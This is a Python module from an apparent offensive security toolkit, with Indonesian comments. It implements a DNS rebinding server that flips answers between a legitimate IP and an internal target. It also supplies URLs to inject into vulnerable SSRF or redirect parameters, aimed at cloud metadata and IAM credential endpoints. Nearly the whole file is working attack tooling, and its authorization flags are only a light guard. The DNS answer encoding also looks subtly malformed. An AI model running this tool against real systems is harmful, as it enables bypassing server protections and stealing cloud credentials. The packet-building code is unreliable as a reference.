"""DNS rebinding: server DNS + exploit untuk bypass SSRF allowlist/SOP.

DNS rebinding memanfaatkan jawaban DNS yang berubah: nama domain yang sama
mengarah ke IP sah (untuk lolos validasi server-side) lalu ke IP internal
(mis. 169.254.169.254) pada request berikutnya.

Modul ini menyediakan:
- `DnsRebinder`: server DNS mini yang menjawab bergantian IP sah <-> IP target
- payload URL (rebind domain) untuk disuntikkan ke SSRF/Open Redirect

HANYA untuk lab/authorized: menjalankan server DNS di port 53 butuh
privilege. Default bind 127.0.0.1 untuk uji lokal.

GUARD: memerlukan `authorized=True` DAN `yes=True`.
"""

import socket
import threading
import time
from typing import List, Optional, Tuple

from keris.core.logger import debug, info, ok, warn


def _dns_name_to_wire(name: str) -> bytes:
    out = b""
    for label in name.rstrip(".").split("."):
        out += bytes([len(label)]) + label.encode("ascii")
    return out + b"\x00"


def _encode_ptr(name: str, ttl: int = 60) -> bytes:
    return b"\xc0\x0c\x00\x01\x00\x01" + ttl.to_bytes(4, "big") \
        + (2).to_bytes(2, "big") + _dns_name_to_wire(name)


class DnsRebinder:
    """Server DNS tunggal yang menjawab A record bergantian (rebinding)."""

    def __init__(self, domain: str, target_ip: str,
                 legit_ip: str = "127.0.0.1", host: str = "127.0.0.1",
                 port: int = 53, flip_every: int = 2):
        self.domain = domain
        self.target_ip = target_ip
        self.legit_ip = legit_ip
        self.host = host
        self.port = port
        self.flip_every = flip_every  # jumlah query sebelum flip
        self._sock = None
        self._thread = None
        self.running = False
        self._count = 0

    def start(self) -> None:
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.host, self.port))
        self._sock.settimeout(1.0)
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        ok(f"DNS rebinding aktif: {self.domain} -> {self.legit_ip}/{self.target_ip} "
           f"(flip tiap {self.flip_every} query) di {self.host}:{self.port}")

    def _loop(self) -> None:
        while self.running:
            try:
                data, addr = self._sock.recvfrom(512)
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                self._handle(data, addr)
            except Exception:
                continue

    def _handle(self, data: bytes, addr) -> None:
        if len(data) < 12:
            return
        txid = data[:2]
        flags = b"\x81\x80"  # response, RD+RA
        ancount = (1).to_bytes(2, "big")
        # extract QNAME len
        pos = 12
        while pos < len(data) and data[pos] != 0:
            pos += 1 + data[pos]
        pos += 1
        qtype = data[pos:pos + 2]
        self._count += 1
        ip = self.target_ip if (self._count % (self.flip_every * 2)) >= self.flip_every else self.legit_ip
        # jawab A record
        answer = _encode_ptr(self.domain)
        answer += b"\x00\x04" + socket.inet_aton(ip)
        resp = txid + flags + b"\x00\x01" + ancount + b"\x00\x00\x00\x00" \
            + data[12:pos] + qtype + b"\x00\x01" + answer
        self._sock.sendto(resp, addr)
        debug(f"DNS {self.domain} -> {ip} (q#{self._count})")

    def stop(self) -> None:
        self.running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass


def rebind_urls(domain: str) -> List[str]:
    """Varian URL untuk disuntikkan (awal legit, nanti berbalik ke target)."""
    return [
        f"http://{domain}/latest/meta-data/",
        f"http://{domain}/latest/meta-data/iam/security-credentials/",
        f"http://{domain}/computeMetadata/v1/",
    ]


def start_rebinder(domain: str, target_ip: str,
                   legit_ip: str = "127.0.0.1", bind: str = "127.0.0.1",
                   port: int = 53, authorized: bool = False,
                   yes: bool = False) -> Optional[DnsRebinder]:
    """Mulai server DNS rebinding. Butuh --authorized + --yes."""
    if not authorized or not yes:
        warn("DNS rebinding memerlukan --authorized DAN --yes.")
        return None
    dns = DnsRebinder(domain, target_ip, legit_ip, host=bind, port=port)
    dns.start()
    info("Suntikkan URL di bawah ke parameter SSRF/redirect yang rentan:")
    for u in rebind_urls(domain):
        info(f"  {u}")
    return dns
